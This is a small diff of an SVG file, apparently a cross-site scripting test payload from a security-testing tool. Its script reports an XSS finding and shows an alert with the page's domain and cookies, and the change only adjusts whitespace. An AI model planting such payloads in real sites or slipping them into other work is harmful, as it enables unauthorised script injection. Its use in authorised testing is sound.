@@ -11,11 +11,10 @@
 	  else {
 	    msg="Finding: XSS because the SVG content is rendering";
 	 }
-  
-	  var alrt = '\r\n\r\nJavaScript alert from this domain: ' + document.domain; 
-	  alrt += '\r\n\r\n' + msg; 
-	  alrt += '\r\n\r\nCookie: '  + document.cookie;
-	  alert(alrt);
-	  	  
+       
+	 var alrt = '\r\n\r\nJavaScript alert from this domain: ' + document.domain; 
+	 alrt += '\r\n\r\n' + msg; 
+	 alrt += '\r\n\r\nCookie: '  + document.cookie;
+	 alert(alrt); 	  
    </script>
 </svg>
